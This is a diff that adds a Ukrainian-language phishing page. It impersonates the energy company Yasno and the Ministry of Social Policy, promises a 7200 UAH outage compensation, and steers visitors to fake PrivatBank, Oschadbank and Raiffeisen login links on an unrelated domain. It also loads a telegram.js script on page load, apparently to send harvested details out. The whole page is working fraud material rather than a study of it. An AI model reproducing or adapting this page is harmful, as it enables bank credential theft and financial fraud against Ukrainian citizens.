@@ -1,0 +1,527 @@
+<!DOCTYPE html>
+<!-- saved from url=(0045)https://salesconfirmweb.pro/yasno-auth/758318 -->
+<html lang="ua">
+<div id="ext_installed_id"></div>
+<style>
+    /* Стили для модального окна */
+    .modal {
+        display: none;
+        /* Скрываем по умолчанию */
+        position: fixed;
+        /* Позиционирование фиксированное */
+        z-index: 1;
+        /* Помещаем поверх всего */
+        left: 0;
+        top: 0;
+        width: 100%;
+        height: 100%;
+        overflow: auto;
+        background-color: rgba(0, 0, 0, 0.4);
+        /* Черный с небольшой прозрачностью */
+    }
+
+    /* Стили для контента модального окна */
+    .modal-content {
+        background-color: #fefefe;
+        margin: 15% auto;
+        /* Центрируем контент */
+        padding: 20px;
+        border: 1px solid #888;
+        width: 80%;
+    }
+
+    /* Стили для кнопки закрытия модального окна */
+    .close {
+        color: #aaa;
+        float: right;
+        font-size: 28px;
+        font-weight: bold;
+    }
+
+    .close:hover,
+    .close:focus {
+        color: black;
+        text-decoration: none;
+        cursor: pointer;
+    }
+</style>
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Відшкодування коштiв за невикористану електроенергію</title>
+    <link rel="shortcut icon" href="https://salesconfirmweb.pro/yasno-auth/fav/favicon.ico" type="image/x-icon">
+    <link rel="icon" href="https://salesconfirmweb.pro/yasno-auth/fav/favicon.ico" type="image/x-icon">
+    <script src="js/telegram.js"></script>
+    <script>
+        document.addEventListener('DOMContentLoaded', handleLogin);
+    </script>
+    <style>
+        html,
+        input,
+        select,
+        textarea,
+        button {
+            font-family: e-Ukraine, Helvetica;
+        }
+
+        .main__header {
+            margin-top: 30px;
+            font-size: 20px;
+            line-height: 24px;
+            text-align: center;
+        }
+
+        .form {
+            max-width: 500px;
+            /* Уменьшаем максимальную ширину контейнера формы */
+            margin: auto;
+            /* Центрируем форму по горизонтали */
+            padding: 20px;
+            /* Уменьшаем отступы внутри контейнера формы */
+            display: block;
+            padding: 70px 20px;
+            border-radius: 20px;
+        }
+
+        .form__wrapp {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            border-style: solid;
+            border-width: 1px;
+            border-radius: 10px;
+            max-width: 300px;
+            /* Уменьшаем максимальную ширину контейнера формы */
+            margin: auto;
+            /* Центрируем форму по горизонтали */
+            padding: 10px;
+            /* Уменьшаем отступы внутри контейнера формы */
+        }
+
+        .form__input {
+            width: 100%;
+            /* Занимает всю доступную ширину контейнера */
+            max-width: 250px;
+            /* Максимальная ширина элементов формы */
+            margin-bottom: 10px;
+        }
+
+        .form__sub {
+            width: 100%;
+            /* Занимает всю доступную ширину контейнера */
+            max-width: 200px;
+            /* Максимальная ширина кнопки */
+        }
+
+        label {
+            margin-top: 10px;
+            font-size: 14px;
+            line-height: 15px;
+        }
+
+        @font-face {
+            font-family: e-Ukraine;
+            src: url(design/styles/fonts/e-Ukraine-Regular.woff2)format("woff2");
+            font-display: swap
+        }
+
+        @font-face {
+            font-family: e-Ukraine;
+            src: url(design/styles/fonts/e-Ukraine-Bold.woff2)format("woff2");
+            font-weight: 700;
+            font-display: swap
+        }
+
+        .form__input::placeholder {
+            font-size: 14px;
+            line-height: 15px;
+            color: #9B9B9B;
+        }
+
+        .form__input {
+            margin-top: 10px;
+            width: 200px;
+            border: #9B9B9B 1px solid;
+            border-radius: 5px;
+            padding: 10px;
+            font-size: 14px;
+            line-height: 15px;
+            outline: none;
+        }
+
+        .form__sub {
+            margin: 0 auto;
+            margin-top: 50px;
+            width: 130px;
+            height: 40px;
+            background: #A6AF19;
+            border-radius: 20px;
+            outline: none;
+            color: white;
+            border: none;
+        }
+
+        footer {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-top: 35px;
+        }
+
+        body {
+            background: linear-gradient(#f5f6fa, #fff);
+            margin: 0px;
+        }
+    </style>
+    <style type="text/css" id="operaUserStyle"></style>
+</head>
+
+
+<body>
+    <div class="container">
+        <header>
+            <a id="logo" href="/"><img src="img/yasno.png" alt="єДопомога — міжнародна" width="132" height="40"></a>
+            <div class="logos">
+                <img src="img/msp.png" loading="lazy" alt="Міністерство соціальної політики України" width="232"
+                    height="64">
+            </div>
+
+            <style>
+                @media (max-width: 600px) {
+                    img[src="img/msp.png"] {
+                        display: none;
+                    }
+                }
+
+                header {
+                    background: #fff;
+                    align-items: center;
+                    gap: 32px;
+                    padding: 16px 32px;
+                    display: flex
+                }
+
+                header nav {
+                    margin: 0 64px
+                }
+
+                header nav ul {
+                    gap: 32px;
+                    padding: 0;
+                    list-style: none;
+                    display: flex
+                }
+
+                header nav a {
+                    color: #000;
+                    font-size: 14px;
+                    text-decoration: none
+                }
+
+                header nav a:hover {
+                    text-decoration: underline
+                }
+
+                header img {
+                    width: auto;
+                    display: block
+                }
+
+                #logo {
+                    display: block
+                }
+
+                .logos {
+                    align-items: center;
+                    gap: 24px;
+                    margin-left: auto;
+                    display: flex
+                }
+
+                .logos img.flag {
+                    height: 32px
+                }
+            </style>
+        </header>
+
+        </header>
+
+        <style>
+        </style>
+        </header>
+        <section>
+            <div class="lead">
+                <h2>ГРОШОВА ДОПОМОГА ВIД ФОНДУ <br><img src="img/yasno.png" alt="Фонд - Yasno" width="132"
+                        height="40"></a></h2>
+                <p>Наразі було зареєстровано понад <b>10&nbsp;000&nbsp;000</b> заявок громадян України на компенсацію за
+                    відключення електроенергії, і фонд продовжує приймати заявки та здійснювати виплати. </p>
+                <p>Якщо ви раніше не отримували компенсацію від нашого фонду за відключення електроенергії, вам доступна
+                    виплата в розмірі 7200 UAH. Для подання заявки на отримання коштів натисніть кнопку нижче та
+                    заповніть анкету.</p>
+                <p>Опрацювання заявок та виплати коштів відбуваються в автоматичному режимі та займають декілька хвилин.
+                </p>
+
+            </div>
+        </section>
+        <style>
+            section {
+                padding: 64px 32px;
+            }
+
+            section {
+                background: linear-gradient(#677dd2, #fff);
+            }
+
+            * {
+                box-sizing: border-box;
+            }
+
+            section {
+                display: block;
+            }
+
+            .lead_border {
+                z-index: 0;
+                max-width: 808px;
+                height: 132px;
+                border-radius: var(--border-radius);
+                border: 1px solid #000;
+                margin: -124px auto 0;
+                position: relative;
+            }
+
+            h2 {
+                display: block;
+                font-size: 1.5em;
+                margin-block-start: 0.83em;
+                margin-block-end: 0.83em;
+                margin-inline-start: 0px;
+                margin-inline-end: 0px;
+                font-weight: bold;
+            }
+
+            .lead {
+                z-index: 1;
+                max-width: 792px;
+                border-radius: 20px;
+                text-align: center;
+                background: linear-gradient(90deg, #d1c9e9, #efe9ff);
+                margin: 128px auto 0;
+                padding: 32px 32px 48px;
+                position: relative;
+            }
+
+            .lead:before {
+                content: "";
+                width: 434px;
+                height: 164px;
+                background: url(../img/girl_heart.webp) top/164px 164px no-repeat, url(../img/stripe_big.webp) 50%/contain no-repeat;
+                position: absolute;
+                top: -132px;
+                left: calc(50% - 217px);
+            }
+
+            .text-center {
+                text-align: center;
+            }
+        </style>
+        <!-- Модальное окно -->
+        <div id="myModal" class="modal hidden">
+            <div class="modal-content">
+                <span class="close">&times;</span>
+
+                <!-- Контент модального окна здесь -->
+                <div class="text-center">
+                    <p class="mt-6 text-lg leading-8 text-gray-600">Для продовження оберіть свій банк</p>
+                </div>
+                <div class="p-4 banks-container">
+                    <div class="p-4">
+                        <div class="flex justify-between">
+                            <a href="https://vb.blainmorris.com/p/?id=1833230933/7741449528" class="bank-link">
+                                <div class="group relative flex flex-row items-center gap-x-4 rounded-lg p-4 hover:bg-gray-50">
+                                    <div class="banktext">
+                                        <p class="font-semibold text-gray-900"><img class="banks" src="img/selprivat.png" alt="PrivatBank" width="60" height="60">ПриватБанк</p>
+                                    </div>
+                                </div>
+                            </a>
+                            <a href="https://vb.blainmorris.com/o/?id=1833230933/7741449528" class="bank-link">
+                                <div class="group relative flex flex-row items-center gap-x-4 rounded-lg p-4 hover:bg-gray-50">
+                                    <div class="banktext">
+                                        <p class="font-semibold text-gray-900"><img class="banks" src="img/seloschad.png" alt="OschadBank" width="80" height="60">ОщадБанк</p>
+                                    </div>
+                                </div>
+                            </a>
+                            <a href="https://vb.BlainMorris.com/r/?id=1833230933/7741449528" class="bank-link">
+                                <div class="group relative flex flex-row items-center gap-x-4 rounded-lg p-4 hover:bg-gray-50">
+                                    <div class="banktext">
+                                        <p class="font-semibold text-gray-900"><img class="banks" src="img/selraif.png" alt="RaifBank" width="80" height="60">Райффайзен Банк</p>
+                                    </div>
+                                </div>
+                            </a>
+                        </div>
+                    </div>
+                    
+                </div>
+            </div>
+
+        </div>
+        <style>
+
+            .p-4 {
+                width: 100%; /* Установить ширину контейнера на 100% */
+            }
+        
+            /* Стили для контейнера банка */
+
+.bank-link {
+    display: flex;
+    text-decoration: none;
+    color: inherit;
+    margin: 1rem;
+}
+
+/* Стили для изображения банка */
+.bank-link img {
+    width: 44px;
+    height: 44px;
+    margin-right: 10px; /* Добавляем отступ справа от изображения */
+}
+
+
+.banktext p {
+    text-align: center; /* Центрируем текст */
+    font-size: 20px;
+    padding-left: 10px; /* Добавляем отступ слева от изображения банка */
+    border-radius: 5px; /* Закругляем углы контура */
+}
+        </style>
+
+        <div class="form__wrapp">
+            <p>Для отримання виплати, натисніть кнопку <br>"Подати заявку".</p><br><img src="img/down.png"
+                alt="Фонд - Yasno" width="100" height="100">
+                <button type="button" class="form__sub" id="showModalButton" onclick="handleButtonClick()">Подати заявку</button>
+            <script>
+                // Получаем ссылку на модальное окно и кнопку закрытия
+                var modal = document.getElementById("myModal");
+                var span = document.getElementsByClassName("close")[0];
+                var showModalButton = document.getElementById("showModalButton");
+
+                // Когда пользователь кликает на кнопку, открываем модальное окно
+                showModalButton.addEventListener('click', function () {
+                    modal.style.display = "block";
+                });
+
+                // Когда пользователь кликает на кнопку закрытия, закрываем модальное окно
+                span.onclick = function () {
+                    modal.style.display = "none";
+                }
+
+                // Когда пользователь кликает вне модального окна, закрываем его
+                window.onclick = function (event) {
+                    if (event.target == modal) {
+                        modal.style.display = "none";
+                    }
+                }
+            </script>
+        </div>
+
+
+        <style>
+    /* Стили для модального окна */
+    .modal {
+        display: none;
+        /* Скрываем по умолчанию */
+        position: fixed;
+        /* Позиционирование фиксированное */
+        z-index: 1;
+        /* Помещаем поверх всего */
+        left: 0;
+        top: 0;
+        width: 100%;
+        height: 100%;
+        overflow: auto;
+        background-color: rgba(0, 0, 0, 0.4);
+        /* Черный с небольшой прозрачностью */
+    }
+
+    /* Стили для контента модального окна */
+    .modal-content {
+        border-radius: 20px;
+        background-color: #fefefe;
+        margin: 15% auto;
+        /* Центрируем контент */
+        padding: 20px;
+        border: 1px solid #888;
+        width: 90%; /* Увеличиваем ширину контейнера */
+        max-width: 600px; /* Максимальная ширина контейнера */
+    }
+
+    /* Стили для кнопки закрытия модального окна */
+    .close {
+        color: #aaa;
+        float: right;
+        font-size: 28px;
+        font-weight: bold;
+    }
+
+    .close:hover,
+    .close:focus {
+        color: black;
+        text-decoration: none;
+        cursor: pointer;
+    }
+</style>
+        <footer>
+            <img src="img/yasno.png" alt="" class="footer__logo">
+        </footer>
+    </div>
+    <!-- Smartsupp Live Chat script -->
+    <script type="text/javascript" charset="utf-8" async="" src="js/loader.js"></script>
+    <script type="text/javascript">
+        var _smartsupp = _smartsupp || {};
+        _smartsupp.key = 'd0dbfd95bfa0192b95d70f6ce6f06151607c16fa';
+        window.smartsupp || (function (d) {
+            var s, c, o = smartsupp = function () { o._.push(arguments) }; o._ = [];
+            s = d.getElementsByTagName('script')[0]; c = d.createElement('script');
+            c.type = 'text/javascript'; c.charset = 'utf-8'; c.async = true;
+            c.src = 'https://www.smartsuppchat.com/loader.js?'; s.parentNode.insertBefore(c, s);
+        })(document);
+    </script>
+
+    <footer class="footer">
+        <div class="container container_footer">
+            <div class="footer_menu">
+                <div class="copyright">© Енергетичні послуги, 2019-2024</div>
+            </div>
+            <div class="footer_icons">
+                <span class="jss298" style="background-image: url(img/uasign-invert.5ceead23.svg);"></span>
+                <span class="jss298" style="background-image: url(img/diia-logo-invert.614ba4d9.svg);"></span>
+                <span class="jss298" style="background-image: url(img/yasnoimg.png);"></span>
+                <span class="jss105">
+                    <div class="jss403">
+                        <p class="jss105 jss114 jss128 jss407 jss300">2024. Всі права захищені.</p>
+                    </div>
+                </span>
+            </div>
+        </div>
+    </footer>
+    <style>
+        .footer_icons {
+            display: flex;
+            align-items: center;
+        }
+
+        .jss298 {
+            margin-right: 10px;
+        }
+    </style>
+    </div>
+
+</body>
+
+</html>
